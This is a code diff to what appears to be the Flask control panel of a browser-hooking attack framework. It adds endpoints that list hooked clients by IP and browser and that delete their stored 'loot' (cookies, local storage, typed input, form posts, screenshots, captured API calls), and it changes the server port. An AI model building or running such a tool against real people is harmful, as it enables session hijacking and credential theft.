@@ -2746,6 +2746,77 @@ def blockClientSession(key):
 
 
 
+@app.route('/api/getUniqueClientValues', methods=['GET'])
+@login_required
+def getUniqueClientValues():
+    clients = Client.query.all()
+
+    ips = sorted(set(escape(client.ipAddress) for client in clients if client.ipAddress))
+    browsers = sorted(set(escape(client.browser) for client in clients if client.browser))
+
+    return jsonify({'ips': ips, 'browsers': browsers})
+
+
+
+@app.route('/api/deleteClientsByFilter', methods=['POST'])
+@login_required
+def deleteClientsByFilter():
+    content    = request.json
+    filterType = content.get('filterType')  # 'ip' or 'browser'
+    filterValue = content.get('filterValue')
+
+    if filterType not in ('ip', 'browser') or not filterValue:
+        return "Invalid filter", 400
+
+    if filterType == 'ip':
+        clients = Client.query.filter_by(ipAddress=filterValue).all()
+    else:
+        clients = Client.query.filter_by(browser=filterValue).all()
+
+    if not clients:
+        return jsonify({'deleted': 0})
+
+    deletedCount = 0
+
+    for client in clients:
+        clientUUID = client.uuid
+        clientID   = client.id
+
+        # Delete all loot data for this client
+        Screenshot.query.filter_by(clientID=clientUUID).delete()
+        HtmlCode.query.filter_by(clientID=clientUUID).delete()
+        UrlVisited.query.filter_by(clientID=clientUUID).delete()
+        UserInput.query.filter_by(clientID=clientUUID).delete()
+        Cookie.query.filter_by(clientID=clientUUID).delete()
+        LocalStorage.query.filter_by(clientID=clientUUID).delete()
+        SessionStorage.query.filter_by(clientID=clientUUID).delete()
+
+        # Delete API call data (headers and calls both have clientID)
+        XhrHeader.query.filter_by(clientID=clientUUID).delete()
+        XhrApiCall.query.filter_by(clientID=clientUUID).delete()
+        FetchHeader.query.filter_by(clientID=clientUUID).delete()
+        FetchApiCall.query.filter_by(clientID=clientUUID).delete()
+
+        FormPost.query.filter_by(clientID=clientUUID).delete()
+        Event.query.filter_by(clientID=clientUUID).delete()
+        ClientPayloadJob.query.filter_by(clientKey=clientID).delete()
+
+        # Delete loot files from disk
+        lootPath = dataDirectory + 'lootFiles/client_' + str(clientID)
+        if os.path.exists(lootPath):
+            shutil.rmtree(lootPath)
+
+        # Delete the client record itself
+        db_session.delete(client)
+        deletedCount += 1
+
+    dbCommit()
+    logger.info("Deleted " + str(deletedCount) + " client(s) matching " + filterType + "=" + filterValue)
+
+    return jsonify({'deleted': deletedCount})
+
+
+
 @app.route('/api/getBlockedIPs', methods=['GET'])
 @login_required
 def getBlockedIPs():
@@ -3072,9 +3143,9 @@ if __name__ == '__main__':
     # If not proxy mode we'll run self-signed cert for testing
     if (proxyMode):
         app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
-        app.run(debug=False, host='0.0.0.0', port=8444)
+        app.run(debug=False, host='0.0.0.0', port=80)
     else:
-        app.run(debug=False, host='0.0.0.0', port=8444, ssl_context='adhoc')
+        app.run(debug=False, host='0.0.0.0', port=80, ssl_context='adhoc')
        
 
 
